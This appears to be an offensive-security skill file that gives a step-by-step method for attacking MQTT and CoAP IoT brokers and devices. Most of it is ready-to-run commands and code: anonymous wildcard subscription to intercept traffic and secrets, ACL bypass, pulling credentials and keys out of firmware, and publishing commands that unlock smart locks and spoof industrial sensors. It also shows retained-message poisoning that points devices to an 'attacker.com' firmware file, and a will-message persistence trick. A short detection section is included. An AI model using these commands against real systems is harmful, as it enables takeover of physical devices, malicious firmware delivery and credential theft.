---
name: offensive-mqtt-coap
description: "MQTT and CoAP IoT messaging protocol attack methodology — MQTT anonymous broker subscription with wildcard topics for credential / sensor / command interception, MQTT topic ACL bypass, retained-message poisoning, will-message abuse, MQTT 5 reason-code analysis, CoAP discovery via .well-known/core, CoAP DTLS PSK extraction from firmware, CoAP block-wise transfer attacks, and pivots from broker access to device control. Use when in-scope IoT devices use cloud or local MQTT/CoAP brokers — common in smart home, industrial telemetry, and automotive telematics."
---

# MQTT & CoAP Attacks

MQTT and CoAP are the dominant IoT messaging protocols. Many deployments use them with default-permissive ACLs, optional authentication, and broker configs that allow anyone to subscribe to everything.

## Quick Workflow

1. Identify broker hostnames + credentials from device firmware or app
2. Connect with anonymous / default creds
3. Subscribe to wildcard topics — capture device commands, telemetry, secrets
4. Test publishing to discovered topics for command injection
5. Pivot to physical device control

---

## MQTT Discovery

### From Firmware

```bash
# Pull broker URLs from firmware
strings firmware.bin | grep -iE "(mqtt|tcp://|ssl://|broker|tls\.|:1883|:8883)"

# Pull from companion app
jadx -d app vendor.apk
grep -rE "(mqtt://|broker|amazonaws|azure|google)" app/

# Common defaults
# 1883/tcp = MQTT cleartext
# 8883/tcp = MQTT TLS
# 8083/tcp = MQTT WebSockets
```

### Network Scan

```bash
nmap -sV -p 1883,8883,8083 -oA mqtt-scan target_subnet/24

# Test broker with mosquitto_sub
mosquitto_sub -h target.broker -p 1883 -t '$SYS/#' -v
# $SYS topics provide broker stats — version, connected clients, etc.
```

## Anonymous Subscribe — Wildcard '#'

```bash
# Subscribe to everything
mosquitto_sub -h target.broker -t '#' -v

# Older brokers / misconfigured: returns ALL traffic
# Includes:
#   - Device telemetry (sensor values, GPS, motion)
#   - Device commands (locks, switches, thresholds)
#   - Cloud commands to devices
#   - User-app to device control messages
#   - Sometimes credentials / tokens in payload
```

If `#` works without credentials, you have full broker visibility — often game-over for an IoT engagement.

## ACL Bypass Patterns

If `#` is denied:

```bash
# Specific topics — the broker may have ACL on '#' but not on patterns
mosquitto_sub -h target.broker -t 'devices/+/telemetry' -v
mosquitto_sub -h target.broker -t 'cmd/lock/+/unlock' -v

# Per-device using wildcard for serial-number-derived topic
mosquitto_sub -h target.broker -t 'devices/serial-12345/#' -v
```

The `+` matches one segment. `#` matches multi-segment. ACL implementations sometimes have logic gaps for `+` only.

## Retained Messages

Retained messages are stored on the broker for new subscribers. Often contain:

- Device's last known config
- Cached commands
- Provisioning state

```bash
# Subscribe with -R to NOT receive retained (just new)
# Without -R, you get retained on first subscribe
mosquitto_sub -h target.broker -t 'devices/+/config' -v
```

### Retained Message Poisoning

If you can publish to a topic that the broker retains:

```bash
mosquitto_pub -h target.broker -t 'devices/all/firmware-url' -m 'http://attacker.com/evil.bin' -r
# -r flag = retained
```

When a device subscribes, it receives the retained attacker message.

## Will Messages

Connect with a "Last Will and Testament" — message published when client disconnects ungracefully.

```python
import paho.mqtt.client as mqtt
c = mqtt.Client('attacker_client')
c.will_set('cmd/door/unlock', 'true', qos=1, retain=True)
c.connect('target.broker', 1883)
# Then disconnect ungracefully
c.disconnect()  # triggers will publication
```

Used as a persistence primitive — the broker re-publishes your malicious command after every legitimate disconnect.

## Publish Attacks

If you can publish to command topics:

```bash
# Smart lock unlock
mosquitto_pub -h target.broker -t 'cmd/lock/AA:BB:CC/unlock' -m '{"action":"unlock"}'

# Light control
mosquitto_pub -h target.broker -t 'lights/livingroom/cmd' -m '{"on":true,"r":255}'

# Industrial telemetry spoofing
mosquitto_pub -h target.broker -t 'sensors/temp/01' -m '{"value":1000}'   # confuse the control system
```

Practical impact depends on what the target device does with the published message.

## MQTT Authentication Bypass

### Username/Password from Firmware

```bash
# Firmware often has plaintext creds
strings firmware.bin | grep -B2 -A2 -i "mqtt\|broker"
# Try defaults: device_name / device_pass, mqtt / mqtt, admin / admin
```

### TLS Client Certificate

Devices using mTLS load a cert from flash. Extract via firmware analysis:

```bash
find rootfs -name "*.pem" -o -name "*.crt" -o -name "*.key" | xargs -I{} cp {} ./certs/

# Test
mosquitto_sub --cert client.crt --key client.key --cafile ca.crt -h target -p 8883 -t '#'
```

### JWT-Based Auth (modern brokers)

Brokers like HiveMQ Cloud, AWS IoT use JWT or signed connections. Extract creds from app:

```bash
# Frida hook the MQTT client library to dump connection params
# (See offensive-mobile)
```

## CoAP

CoAP is the lighter-weight UDP/CoAP-based REST protocol. UDP/5683.

```bash
# Discover via .well-known/core
coap-client -m get coap://device/.well-known/core

# Output lists resources:
# </led>;rt="led";if="lit",</temp>;rt="temp"

# Read resource
coap-client -m get coap://device/temp

# Write resource
coap-client -m put coap://device/relay/0 -e '1'
```

## CoAP DTLS PSK Theft

CoAP secured with DTLS uses pre-shared keys. PSKs hardcoded in firmware:

```bash
strings firmware.bin | grep -iE "(psk|pre-shared|dtls)"

# Use extracted PSK
coap-client -m get coaps://device/temp -k <psk-hex>
```

## CoAP Block-Wise Transfer Attacks

CoAP supports block-wise transfer for large messages. Implementation flaws:

- Block index reordering corrupts buffer state
- Block-size confusion causing buffer overflows
- Resource exhaustion via malformed block sequences

Test with crafted CoAP messages:

```python
# coapthon library
from coapthon.client.helperclient import HelperClient
c = HelperClient(server=('10.0.0.5', 5683))
# Send malformed Block1 / Block2 options
```

## MQTT/CoAP Tooling

| Tool | Use |
|---|---|
| `mosquitto_sub` / `mosquitto_pub` | Standard MQTT client |
| `paho-mqtt` (Python) | Programmatic |
| `MQTT-PWN` | Automated MQTT pentest framework |
| `coap-client` (libcoap) | CoAP CLI |
| `coapthon` (Python) | Programmatic |
| `Aedes` / `EMQX` test brokers | Stand up local broker for replay |

## Engagement Cheatsheet

```bash
# 1. Identify broker
strings firmware.bin | grep -iE "mqtt|broker"

# 2. Anonymous test
mosquitto_sub -h <broker> -t '#' -v -t '$SYS/#' -v

# 3. If denied, try defaults from app
mosquitto_sub -h <broker> -u admin -P admin -t '#' -v

# 4. With creds, subscribe broadly
mosquitto_sub -h <broker> -u <u> -P <p> -t '#' -v | tee mqtt_capture.log

# 5. Identify command topics from telemetry patterns
# Subscribe -> observe what app/cloud sends to control devices

# 6. Publish to command topics (with authorization)
mosquitto_pub -h <broker> -u <u> -P <p> -t 'cmd/<device>/action' -m '<payload>'

# 7. CoAP discovery + interaction
coap-client -m get coap://device/.well-known/core
```

## Detection

| Signal | Defender View |
|---|---|
| Wildcard `#` subscribe | Broker logs (if enabled) show client subscribed to all topics |
| Many concurrent connections | Connection rate alarms |
| Cross-tenant pattern access (in cloud brokers) | Cloud-side ACL rejection logs |
| Retained-message floods | Broker memory growth |

In cloud-managed brokers (AWS IoT, HiveMQ Cloud), defenders see attacker activity quickly. Self-hosted Mosquitto brokers often have minimal logging.

## Reporting

- Broker hostname / IP and authentication state observed
- Topics accessed (read / wrote)
- Specific commands successfully published with effect observed
- Hardcoded credentials found
- Cloud-side vs local broker (informs remediation)

---

## Key References

- MQTT v3.1.1 / v5.0 specs — mqtt.org
- CoAP RFC 7252 + extensions
- "Hacking the IoT" research from Black Hat / DEF CON
- HiveMQ + Mosquitto security best practices
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/iot.md
